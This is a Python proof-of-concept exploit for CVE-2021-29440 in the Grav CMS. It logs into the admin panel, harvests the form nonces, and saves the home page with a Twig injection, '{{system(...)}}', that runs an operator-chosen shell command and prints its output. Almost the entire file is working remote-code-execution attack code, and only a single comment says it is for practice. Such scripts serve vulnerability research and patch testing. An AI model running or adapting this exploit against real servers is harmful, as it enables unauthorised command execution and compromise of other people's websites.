#Copyright: https://github.com/hopin1005/CVE-POC.git
#Note: Make sure home page exist.
#This script just practice automatically getting shell. Do not use for crime.
#This script use python3.

import sys
import requests
from bs4 import BeautifulSoup


#input parameter
if len(sys.argv) < 5:
    print("[+]Usage: python CVE-2021-29440.py target username password payload")
    print("[+]Example: python CVE-2021-29440.py http://127.0.0.1 admin admin id")
    exit()

target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ssti_payload = sys.argv[4]

session = requests.Session()
#login admin panel
def login(target, username, password):

    adminUrl = target + "/admin"
    adminResponse = session.get(adminUrl)
    

    if(adminResponse.status_code == 200):
        print("[+]Find admin page!")
        soup = BeautifulSoup(adminResponse.text, features="html.parser")
        loginNonce = soup.find('input',{'name':'login-nonce'})['value']
    
        
        data = { "data[username]": username, "data[password]": password, "task": "login", "login-nonce": loginNonce }
        header = {"Content-Type": "application/x-www-form-urlencoded"}

        #admin cookies grav-site-1dfbe94-admin
        session.post(adminUrl, data = data, headers = header,allow_redirects=True)
        
    else:
        print("[+]Admin Page is not found!")
        exit()

def addpayload():
    createUrl = target + "/admin/pages/home"
    createUrlRes = session.get(createUrl)
    soup = BeautifulSoup(createUrlRes.text, features="html.parser")
    pageTitle = soup.find('title').string
    if(pageTitle == "Home ( / ) | Grav"):
        print("[+]Success login admin page")
    else:
        print("[+]Failed login admin page")
        exit()
    
    #get form-nonce and uniqu id
    formNonce = soup.find('input', {'name':'form-nonce'})['value']
    formId = soup.find('input', {'name':'__unique_form_id__'})['value']

    #add ssti payload
    sample_payload = "task=save&data[header][title]=Home&data[content]={{system('id')}}&data[header][media_order]=&data[folder]=home&data[route]=&data[name]=default&data[header][body_classes]=title-center+title-h1h2&data[ordering]=1&data[order]=&toggleable_data[header][process]=1&data[header][process][markdown]=1&data[header][process][twig]=1&data[header][order_by]=&data[header][order_manual]=&data[blueprint]=&data[lang]=&_post_entries_save=edit&__form-name__=flex-pages&__unique_form_id__=961f500aa5071a34a27ea7cebc5b9ff9&form-nonce=8ca04e62cb368fb2180a48d84dbf91d2&toggleable_data[header][published]=0&toggleable_data[header][date]=0&toggleable_data[header][publish_date]=0&toggleable_data[header][unpublish_date]=0&toggleable_data[header][metadata]=0&toggleable_data[header][dateformat]=0&toggleable_data[header][menu]=0&toggleable_data[header][slug]=0&toggleable_data[header][redirect]=0&toggleable_data[header][twig_first]=0&toggleable_data[header][never_cache_twig]=0&toggleable_data[header][child_type]=0&toggleable_data[header][routable]=0&toggleable_data[header][cache_enable]=0&toggleable_data[header][visible]=0&toggleable_data[header][debugger]=0&toggleable_data[header][template]=0&toggleable_data[header][append_url_extension]=0&toggleable_data[header][routes][default]=0&toggleable_data[header][routes][canonical]=0&toggleable_data[header][routes][aliases]=0&toggleable_data[header][admin][children_display_order]=0&toggleable_data[header][login][visibility_requires_access]=0&toggleable_data[header][permissions][inherit]=0&toggleable_data[header][permissions][authors]=0"
    sample_payload = sample_payload.split("&")
    data = {}
    for i in sample_payload:
        keys = i.split("=")
        data[keys[0]] = keys[1]


    #add crlf to paylaod
    
    data['data[content]'] ="{{system('" + ssti_payload + "')}}\r\n\r\n" 
    data['__unique_form_id'] = formId
    data['form-nonce'] = formNonce
    print(data['data[content]'])

    header = {"Content-Type": "application/x-www-form-urlencoded"}
    session.post(createUrl, data = data, headers = header)
    
    #return page content
    pageRes = session.get(target)
    soup = BeautifulSoup(pageRes.text, features="html.parser")
    rceRes = soup.find('p').string
    print(rceRes)
    
    
def main():

    login(target, username, password)
    addpayload()
    
main()
    